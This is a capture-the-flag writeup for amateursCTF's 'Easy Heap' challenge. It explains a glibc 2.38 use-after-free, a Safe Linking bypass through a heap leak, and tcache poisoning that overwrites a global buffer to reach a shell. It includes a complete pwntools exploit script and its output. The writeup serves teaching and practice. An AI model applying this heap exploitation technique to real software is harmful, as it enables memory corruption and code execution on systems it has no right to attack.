---
title: "amateursCTF Easy Heap — Writeup"
date: 2025-11-19
categories:
  - ctftime
tags:
  - pwn
  - heap
  - uaf
  - safe-linking
  - glibc-2.38
---

# amateursCTF Easy Heap — Writeup

Compact writeup for a Glibc 2.38 heap challenge (amateursCTF: Easy Heap) using a Use-After-Free read to bypass Safe Linking and poison tcache to overwrite a global buffer. Decompilation for analysis was obtained from dogbolt.org.

## Summary

The binary is a typical menu-driven note manager (Alloc, Free, Edit, View). It is compiled without PIE, so global symbols reside at static addresses. A hidden option (67) triggers a `check()` function that spawns a shell if a global `checkbuf` contains a specific string. A Use-After-Free (UAF) lets us read the forward link of a freed tcache chunk to derive the heap address (bypassing Safe Linking), then perform tcache poisoning to return a pointer into the global `checkbuf` and overwrite it—no libc leak needed.

## Vulnerability

1) Use-After-Free (UAF): The program frees pointers but doesn’t null out entries in its storage array, so Edit/View can still access freed chunks.

```c
// Decompilation logic (dogbolt.org)
else if (local_b4 == 1) {
    free((void *)auStack_a8[local_b0]);
    // Vulnerability: auStack_a8[local_b0] is NOT set to NULL
}
```

2) Safe Linking (Glibc 2.38): Tcache singly-linked list pointers are mangled:
```
stored_fd = (chunk_addr >> 12) ^ next_ptr
```
A UAF read on a single-element tcache bin yields `(chunk_addr >> 12)` (since `next_ptr == 0`), letting us recover the heap base and craft a valid poisoned FD.

## Exploitation

- Heap leak (bypass Safe Linking)
  1. Allocate chunk at index 0 and free it.
  2. Use UAF “View” on index 0 to read the tcache FD.
  3. Since it’s the last in its bin, `next_ptr == 0`, so `leak = (heap_base >> 12)`.
  4. Recover heap base via `heap_base = leak << 12`.

- Tcache poisoning
  1. Allocate and free another chunk at index 1.
  2. Compute `fake_fd = (chunk1_addr >> 12) ^ checkbuf_addr` (static due to no PIE).
  3. Use UAF “Edit” on index 1 to overwrite its FD with `fake_fd`.

- Overwrite and win
  1. Allocate to consume the real chunk (index 1).
  2. Allocate again; the allocator returns a pointer to `checkbuf`.
  3. Write the magic string “ALL HAIL OUR LORD AND SAVIOR TEEMO”.
  4. Invoke menu option 67 to trigger `system("sh")`.

## Socket Solver

```python
from pwn import *

exe = ELF('./chal')
context.binary = exe

TARGET_STRING = b"ALL HAIL OUR LORD AND SAVIOR TEEMO"

def start():
    if args.REMOTE:
        return remote('amt.rs', 37557)
    else:
        return process([exe.path])

io = start()

# --- Helper Functions based on Decompilation ---
def malloc(idx):
    io.sendlineafter(b'> ', b'0')      # Menu 0: Malloc
    io.sendlineafter(b'> ', str(idx).encode())

def free(idx):
    io.sendlineafter(b'> ', b'1')      # Menu 1: Free
    io.sendlineafter(b'> ', str(idx).encode())

def edit(idx, payload):
    io.sendlineafter(b'> ', b'2')      # Menu 2: Read (Edit)
    io.sendlineafter(b'> ', str(idx).encode())
    io.sendlineafter(b'data> ', payload)

def view(idx):
    io.sendlineafter(b'> ', b'3')      # Menu 3: Write (View)
    io.sendlineafter(b'> ', str(idx).encode())
    io.recvuntil(b'data> ')
    return io.recv(0x67) # Reads 0x67 bytes

def win():
    io.sendlineafter(b'> ', b'67')     # Menu 67: Check/Win

# --- Safe Linking Helper ---
def obfuscate(pos, ptr):
    return (pos >> 12) ^ ptr

# ==================================================
# EXPLOTATION START
# ==================================================

log.info("Step 1: Leaking Heap Base...")

# 1. Alloc and Free a chunk to populate Tcache
malloc(0)
free(0)

# 2. Read the Safe-Linked pointer
# Since it's the only chunk in bin, fd = (HeapBase >> 12) ^ 0
leak_data = view(0)
mangled_ptr = u64(leak_data[:8])
heap_base = mangled_ptr << 12

log.success(f"Heap Base: {hex(heap_base)}")

log.info("Step 2: Tcache Poisoning...")

# 1. Alloc a new chunk (Index 1)
malloc(1)

# 2. Free it to put it in Tcache
free(1)

# 3. Calculate the target address (checkbuf)
# We need to find where checkbuf is. 
# Since No-PIE, we use the symbol from the binary.
checkbuf_addr = exe.symbols['checkbuf']
log.info(f"Target: checkbuf @ {hex(checkbuf_addr)}")

# 4. Calculate the obfuscated pointer
# We need the address of the chunk we are currently overwriting (Index 1)
# Index 0 was at offset 0x2a0 (usually)
# Index 1 should be at offset 0x330 (0x2a0 + 0x90 aligned)
# But we can just use the base + offset logic safely.
# The first malloc usually lands at heap_base + 0x2a0 (tcache struct overhead)
chunk_1_addr = heap_base + 0x330 

fake_ptr = obfuscate(chunk_1_addr, checkbuf_addr)

# 5. Overwrite the fd pointer of the free chunk
edit(1, p64(fake_ptr))

log.info("Step 3: Allocating to Target...")

# 1. Malloc (consumes the chunk we just freed)
malloc(2)

# 2. Malloc again (consumes our FAKE chunk -> checkbuf)
malloc(3)

# 3. Write the secret passphrase into checkbuf
log.info(f"Writing passphrase: {TARGET_STRING}")
edit(3, TARGET_STRING + b'\x00')

log.info("Step 4: Triggering Win Condition...")
win()
io.send(b'cat flag\n')
io.interactive()
```

## Result

After overwriting `checkbuf`, selecting option 67 spawns a shell and read flag instantly:

```
[+] Opening connection to amt.rs on port 37557: Done
[*] Step 1: Leaking Heap Base...
[+] Heap Base: 0x13e18000
[*] Step 2: Tcache Poisoning...
[*] Target: checkbuf @ 0x404040
[*] Step 3: Allocating to Target...
[*] Writing passphrase: b'ALL HAIL OUR LORD AND SAVIOR TEEMO'
[*] Step 4: Triggering Win Condition...
[*] Switching to interactive mode
check.
amateursCTF{what_is_a_flag?why_am_i_even_doing_this_anymore?crazy?i_was_crazy_once...}
```
